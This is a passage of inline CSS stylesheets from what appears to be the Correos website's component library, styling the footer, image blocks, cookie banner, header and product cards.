			flex: 0 1 50%;
			margin: 0 32px 0 55px
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 60%;
			flex: 0 1 60%
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-fieldset.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
			padding: 64px 40px
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-cdk-imageblock-h {
			--_cdk-imageblock-background-color: var(--cdk-imageblock-background-color, white);
			--_cdk-imageblock-border-radius: var(--cdk-imageblock-border-radius, white)
		}

		.sc-correos-cdk-imageblock-h {
			width: 100%;
			height: 100%;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center;
			-ms-flex-align: center;
			align-items: center;
			position: relative
		}

		.sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			width: 100%;
			margin: 0;
			padding: 0;
			overflow: hidden;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center
		}

		.sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			width: 100%
		}

		[cover-ajust=true].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: 100%
		}

		[cover-ajust=true].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			height: 100%;
			-o-object-fit: cover;
			object-fit: cover
		}

		[variant=card-head].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			width: auto;
			height: 100%;
			max-width: 960px;
			max-height: 960px
		}

		[variant=card-head].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			width: 100%;
			height: 100%;
			-o-object-fit: cover;
			object-fit: cover
		}

		[variant=article-modules].sc-correos-cdk-imageblock-h {
			-ms-flex-align: initial;
			align-items: initial
		}

		[variant=article-modules].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: 168px
		}

		[variant=article-modules].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			height: 100%;
			-o-object-fit: cover;
			object-fit: cover
		}

		[variant=article-modules][parent-size=sm].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: 224px
		}

		[variant=article-modules][parent-size=md].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock,
		[variant=article-modules][parent-size=lg].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: auto
		}

		[variant=article-modules][parent-size=lg].sc-correos-cdk-imageblock-h {
			position: relative
		}

		[variant=article-modules][parent-size=lg].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			width: 100%;
			height: 100%;
			position: absolute
		}

		[variant=highlight-article-modules].sc-correos-cdk-imageblock-h {
			-ms-flex-align: initial;
			align-items: initial
		}

		[variant=highlight-article-modules].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: 144px
		}

		[variant=highlight-article-modules].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			height: 100%;
			-o-object-fit: cover;
			object-fit: cover
		}

		[variant=highlight-article-modules][parent-size=md].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: 272px
		}

		[variant=highlight-article-modules][parent-size=lg].sc-correos-cdk-imageblock-h {
			position: relative
		}

		[variant=highlight-article-modules][parent-size=lg].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: auto
		}

		[variant=highlight-article-modules][parent-size=lg].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			width: 100%;
			height: 100%;
			position: absolute
		}

		@media (min-width: 1024px) {
			[variant=podcast].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				border-radius: 8px
			}
		}

		[variant=with-border-radius].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			border-radius: 8px
		}

		[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			width: 100%
		}

		@media (min-width: 1024px) {
			[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				border-radius: 8px
			}
		}

		[variant=with-logo].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			height: auto;
			width: 100%
		}

		@media (min-width: 640px) {
			[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				width: auto;
				padding: inherit
			}
		}

		@media (min-width: 1024px) {
			[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				width: auto;
				padding: inherit
			}
		}

		.sc-correos-cdk-imageblock-h .ui-img-logo-container.sc-correos-cdk-imageblock {
			position: absolute;
			left: 16px;
			bottom: 0;
			width: 80px
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-imageblock-h .ui-img-logo-container.sc-correos-cdk-imageblock {
				left: 20px;
				width: 150px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-imageblock-h .ui-img-logo-container.sc-correos-cdk-imageblock {
				left: 24px;
				width: 200px
			}
		}

		.sc-correos-cdk-imageblock-h .cdk-border-radius-img.sc-correos-cdk-imageblock {
			border-radius: 8px
		}

		.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock {
			position: -webkit-sticky;
			position: sticky;
			margin-bottom: 16px;
			border: 1px solid var(--_cdk-imageblock-border-radius);
			border-radius: 8px;
			background-color: var(--_cdk-imageblock-background-color);
			padding: 5px;
			height: 80px;
			max-height: 80px;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			-ms-flex-pack: center;
			justify-content: center
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock {
				height: 150px;
				max-height: 150px;
				margin-bottom: 20px;
				padding: 10px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock {
				height: 200px;
				max-height: 200px;
				margin-bottom: 24px;
				padding: 20px
			}
		}

		.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock img.sc-correos-cdk-imageblock {
			height: auto;
			width: auto
		}

		.sc-correos-cdk-imageblock-h .hidden.sc-correos-cdk-imageblock {
			display: none
		}

		[variant=image-contains].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: 100%
		}

		[variant=image-contains].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			height: 100%;
			-o-object-fit: contain;
			object-fit: contain
		}

		[variant=image-contains-small].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
			height: 80%;
			border-radius: 8px
		}

		[variant=image-contains-small].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
			height: 80%;
			-o-object-fit: contain;
			object-fit: contain
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-cdk-cookies-module-h {
			--_cdk-cookies-module-background-color: var(--cdk-cookies-module-background-color, white)
		}

		.sc-correos-cdk-cookies-module-h {
			display: block
		}

		.sc-correos-cdk-cookies-module-h correos-cdk-pop-up.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
			display: block
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-cookies-module-h correos-cdk-pop-up.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
				margin: 24px 0
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h correos-cdk-pop-up.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
				margin: 24px 0
			}
		}

		.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module {
			background-color: var(--theme-color-blue);
			width: 100%;
			margin: 0 16px 16px 16px;
			padding: 16px;
			border-radius: var(--theme-borderRadius-card);
			position: fixed;
			bottom: 0;
			width: calc(100% - 32px);
			z-index: 18
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				margin: 0 24px 24px 24px;
				padding: 24px;
				width: calc(100% - 48px)
			}
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
				margin-bottom: 24px
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
				margin-right: 16px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
				margin-right: 24px
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button.sc-correos-cdk-cookies-module {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: end;
				justify-content: flex-end;
				min-width: -webkit-fit-content;
				min-width: -moz-fit-content;
				min-width: fit-content
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button.sc-correos-cdk-cookies-module {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: end;
				justify-content: flex-end;
				min-width: -webkit-fit-content;
				min-width: -moz-fit-content;
				min-width: fit-content
			}
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button__first.sc-correos-cdk-cookies-module {
				margin-bottom: 12px
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button__first.sc-correos-cdk-cookies-module {
				margin-right: 16px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button__first.sc-correos-cdk-cookies-module {
				margin-right: 24px
			}
		}

		.sc-correos-cdk-cookies-module-h .--displayNone.sc-correos-cdk-cookies-module {
			display: none
		}

		.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
			display: -ms-flexbox;
			display: flex
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
				-ms-flex-direction: column-reverse;
				flex-direction: column-reverse
			}

			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module .cdk-list-modal__desc.sc-correos-cdk-cookies-module {
				margin-top: 16px
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
				-ms-flex-pack: justify;
				justify-content: space-between
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
				-ms-flex-pack: justify;
				justify-content: space-between
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal__desc.sc-correos-cdk-cookies-module {
				width: 74%
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal__desc.sc-correos-cdk-cookies-module {
				width: 78%
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module:last-child correos-ui-separator-line.sc-correos-cdk-cookies-module {
				display: none
			}
		}

		.sc-correos-cdk-cookies-module-h .cdk-first-title.sc-correos-cdk-cookies-module {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-first-title.sc-correos-cdk-cookies-module {
				-ms-flex-direction: row;
				flex-direction: row
			}
		}

		.sc-correos-cdk-cookies-module-h .cdk-switch.sc-correos-cdk-cookies-module {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: justify;
			justify-content: space-between;
			width: 100%;
			-ms-flex-align: start;
			align-items: flex-start
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-cookies-module-h .cdk-switch.sc-correos-cdk-cookies-module {
				width: 24%
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-switch.sc-correos-cdk-cookies-module {
				width: 18%
			}
		}

		.sc-correos-cdk-cookies-module-h .cdk-button-cookies.sc-correos-cdk-cookies-module {
			margin: 0;
			margin-bottom: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-button-cookies.sc-correos-cdk-cookies-module {
				margin-bottom: 0px;
				min-width: 100px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-button-cookies.margin-desktop.sc-correos-cdk-cookies-module {
				margin-bottom: 16px
			}
		}

		.sc-correos-cdk-cookies-module-h .cdk-button-cookies__second.sc-correos-cdk-cookies-module {
			margin-bottom: 12px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-button-cookies__second.sc-correos-cdk-cookies-module {
				margin-bottom: 0px;
				margin-right: 16px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-cookies-module-h .cdk-button-cookies__second.margin-desktop-second.sc-correos-cdk-cookies-module {
				margin-bottom: 12px;
				margin-right: 0
			}
		}

		.d-none.sc-correos-cdk-cookies-module-h {
			display: none
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-cdk-dual-header-h {
			--_cdk-dual-header-background-color: var(--cdk-dual-header-background-color, white)
		}

		.sc-correos-cdk-dual-header-h {
			display: block;
			width: 100%;
			position: relative;
			min-height: 160px;
			margin-bottom: -24px;
			--_content-max-width: var(--cdk-dualheader-content-max-width)
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-dual-header-h {
				margin-bottom: 0
			}
		}

		.sc-correos-cdk-dual-header-h .sc-correos-cdk-dual-header-s>[slot=breadcrumb] {
			display: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-dual-header-h .sc-correos-cdk-dual-header-s>[slot=breadcrumb] {
				display: block;
				padding-top: 24px;
				padding-bottom: 24px
			}
		}

		.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header {
			display: -ms-flexbox;
			display: flex;
			position: relative;
			overflow-x: hidden
		}

		.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-img.sc-correos-cdk-dual-header {
			position: relative;
			background-repeat: no-repeat;
			background-size: cover;
			background-position: center center;
			min-height: 148px;
			width: 100%;
			display: none
		}

		.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-img.sc-correos-cdk-dual-header .cdk-content-end.sc-correos-cdk-dual-header {
			display: none
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-img.sc-correos-cdk-dual-header {
				width: 40%;
				display: block
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-img.sc-correos-cdk-dual-header {
				width: 50%;
				display: block
			}
		}

		.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-body.sc-correos-cdk-dual-header {
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: start;
			justify-content: flex-start;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			padding: 2rem 24px 3rem 24px
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-body.sc-correos-cdk-dual-header {
				width: 60%;
				min-height: 320px;
				padding: 2rem 48px 3rem 48px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-body.sc-correos-cdk-dual-header {
				width: 50%;
				min-height: 360px;
				padding: 56px 100px 56px 128px;
				margin-bottom: 35px;
				-ms-flex-pack: start;
				justify-content: flex-start
			}
		}

		.sc-correos-cdk-dual-header-h .cdk-content-end.sc-correos-cdk-dual-header {
			position: absolute;
			bottom: 0px
		}

		.sc-correos-cdk-dual-header-h .sc-correos-cdk-dual-header-s>[slot=cdk-body-containt] {
			max-width: var(--_content-max-width)
		}

		.sc-correos-cdk-dual-header-h .sc-correos-cdk-dual-header-s>[slot=extra-section] {
			position: relative;
			width: 100%
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-dual-header-h .sc-correos-cdk-dual-header-s>[slot=extra-section] {
				bottom: 24px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-dual-header-h .sc-correos-cdk-dual-header-s>[slot=extra-section] {
				bottom: 55px
			}
		}

		@media (max-width: 639px) {
			[show-image-mobile=true].sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header {
				-ms-flex-direction: column;
				flex-direction: column
			}

			[show-image-mobile=true].sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-img.sc-correos-cdk-dual-header {
				display: block
			}

			[show-image-mobile=true].sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-img.sc-correos-cdk-dual-header .cdk-content-end.sc-correos-cdk-dual-header {
				position: absolute;
				bottom: 0px;
				display: block
			}
		}

		[show-decoration=true].sc-correos-cdk-dual-header-h .cdk-decoration-container.sc-correos-cdk-dual-header {
			position: absolute;
			height: 100%;
			width: 100%;
			left: 50%;
			-webkit-transform: translateX(-50%);
			transform: translateX(-50%);
			min-width: 1024px;
			display: block
		}

		[show-decoration=true].sc-correos-cdk-dual-header-h .cdk-decoration-container.sc-correos-cdk-dual-header .cdk-figure-top.sc-correos-cdk-dual-header {
			margin: 0;
			position: absolute;
			right: -50px;
			top: 90px
		}

		[show-decoration=true].sc-correos-cdk-dual-header-h .cdk-decoration-container.sc-correos-cdk-dual-header .cdk-figure-left.sc-correos-cdk-dual-header {
			margin: 0;
			position: absolute;
			left: -130px;
			bottom: 60px
		}

		[show-decoration=true].sc-correos-cdk-dual-header-h .cdk-decoration-container.sc-correos-cdk-dual-header .cdk-figure-right.sc-correos-cdk-dual-header {
			margin: 0;
			position: absolute;
			right: -240px;
			bottom: 0
		}

		@media (max-width: 639px) {
			[show-decoration=true].sc-correos-cdk-dual-header-h .cdk-decoration-container.sc-correos-cdk-dual-header {
				display: none
			}
		}

		[show-decoration=true].sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-body.sc-correos-cdk-dual-header {
			-ms-flex-pack: start;
			justify-content: flex-start;
			padding-left: 60px;
			padding-right: 60px;
			z-index: 1
		}

		@media (min-width: 1024px) {
			[show-decoration=true].sc-correos-cdk-dual-header-h .cdk-container.sc-correos-cdk-dual-header .cdk-body.sc-correos-cdk-dual-header {
				padding-left: 130px;
				padding-right: 130px
			}
		}
	</style>
	<style>
		.sc-correos-ui-product-quality-card-h {
			--_ui-product-quality-card-bg: var(--ui-product-quality-card-bg, teal);
			--_ui-product-quality-card-shadow-desktop: var(--ui-product-quality-card-box-shadow-desktop);
			--_ui-product-quality-card-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.2);
			--_ui-product-quality-card-border: 1px solid var(--ui-product-quality-card-border, red);
			--_ui-product-quality-card-title: var(--ui-product-quality-card-title, red);
			--_ui-product-quality-card-subtitle: var(--ui-product-quality-card-subtitle, yellow);
			--_ui-product-quality-card-icon: var(--ui-product-quality-card-icon, purple);
			--_ui-product-quality-card-paragraph: var(--ui-product-quality-card-paragraph, pink);
			--_ui-product-quality-card-radius: var(--ui-product-quality-card-radius, 20px)
		}

		.sc-correos-ui-product-quality-card-h {
			display: block;
			background-color: var(--_ui-product-quality-card-bg);
			border: var(--_ui-product-quality-card-border);
			border-radius: var(--_ui-product-quality-card-radius);
			-webkit-box-shadow: var(--_ui-product-quality-card-shadow);
			box-shadow: var(--_ui-product-quality-card-shadow)
		}

		.sc-correos-ui-product-quality-card-h .ui-mobile.sc-correos-ui-product-quality-card {
			display: -ms-flexbox;
			display: flex;
			width: 100%;
			padding: 16px 24px 16px 16px;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: justify;
			justify-content: space-between;
			text-decoration: none;
			border-radius: var(--_ui-product-quality-card-radius)
		}

		.sc-correos-ui-product-quality-card-h .ui-mobile.sc-correos-ui-product-quality-card .ui-mobile-container.sc-correos-ui-product-quality-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			width: calc(100% - 32px)
		}

		.sc-correos-ui-product-quality-card-h .ui-mobile.sc-correos-ui-product-quality-card .ui-mobile-content.sc-correos-ui-product-quality-card {
			width: calc(100% - 89px);
			white-space: nowrap
		}

		.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card {
			display: none;
			width: 100%
		}

		.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-wrapper.sc-correos-ui-product-quality-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		.sc-correos-ui-product-quality-card-h .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=title-desktop] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 1.125rem;
			line-height: 1.625rem;
			margin-bottom: 8px;
			font-weight: bold
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-product-quality-card-h .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=title-desktop] {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-ui-product-quality-card-h .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=body-text-desktop] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_ui-product-quality-card-paragraph);
			font-size: 0.875rem;
			line-height: 1.375rem;
			margin-bottom: 24px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-product-quality-card-h .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=body-text-desktop] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-figure.sc-correos-ui-product-quality-card {
			margin: 0;
			padding: 0;
			border: 0;
			font-size: 100%;
			font: inherit;
			vertical-align: baseline
		}

		.sc-correos-ui-product-quality-card-h .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
			width: 100%;
			height: 100%
		}

		@media (min-width: 640px) {
			.sc-correos-ui-product-quality-card-h .ui-mobile.sc-correos-ui-product-quality-card {
				display: none
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				height: 100%;
				padding: 16px;
				height: 100%
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-figure.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				width: 176px;
				height: 176px;
				margin-right: 16px;
				min-width: 130px
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-wrapper.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				height: 100%
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-wrapper.sc-correos-ui-product-quality-card .ui-desktop-section.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				margin-top: auto
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-wrapper.sc-correos-ui-product-quality-card .ui-desktop-section__button.sc-correos-ui-product-quality-card {
				margin-right: 16px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-product-quality-card-h .ui-mobile.sc-correos-ui-product-quality-card {
				display: none
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				height: 100%;
				-webkit-box-shadow: var(--_ui-product-quality-card-shadow-desktop);
				box-shadow: var(--_ui-product-quality-card-shadow-desktop);
				padding: 24px
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-wrapper.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				height: 100%
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-wrapper.sc-correos-ui-product-quality-card .ui-desktop-section.sc-correos-ui-product-quality-card {
				margin-top: auto
			}

			.sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-figure.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				width: 176px;
				height: 176px;
				margin-right: 24px;
				min-width: 130px
			}
		}

		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=title-mobile],
		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=title-desktop] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 1.125rem;
			line-height: 1.625rem;
			color: var(--_ui-product-quality-card-title);
			font-weight: bold;
			margin-bottom: 16px
		}

		@media (min-width: 1024px) {

			.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=title-mobile],
			.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=title-desktop] {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=body-text-desktop] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_ui-product-quality-card-paragraph);
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: 300
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=body-text-desktop] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=title-mobile] {
			overflow: hidden;
			text-overflow: ellipsis;
			display: block
		}

		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=subtitle-mobile] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_ui-product-quality-card-subtitle);
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: 300;
			overflow: hidden;
			text-overflow: ellipsis;
			display: block
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=subtitle-mobile] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=image-mobile] {
			width: 72px;
			height: 72px;
			margin-right: 16px
		}

		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=icon-mobile] {
			color: var(--_ui-product-quality-card-icon);
			margin-left: 8px
		}

		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=linkleft],
		.sc-correos-ui-product-quality-card-h .sc-correos-ui-product-quality-card-s>[slot=linkright] {
			white-space: nowrap
		}

		@media (min-width: 640px) {

			.sc-correos-ui-product-quality-card-h[size=xs] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop],
			.sc-correos-ui-product-quality-card-h[size=sm] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
				margin-bottom: 16px;
				margin-right: 0
			}
		}

		@media (min-width: 1024px) {

			.sc-correos-ui-product-quality-card-h[size=xs] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop],
			.sc-correos-ui-product-quality-card-h[size=sm] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
				margin-bottom: 24px;
				margin-right: 0
			}
		}

		[size=sm].sc-correos-ui-product-quality-card-h .ui-desktop-section.sc-correos-ui-product-quality-card {
			-ms-flex-direction: row;
			flex-direction: row
		}

		@media (min-width: 640px) {

			[size=md].sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card,
			[size=lg].sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

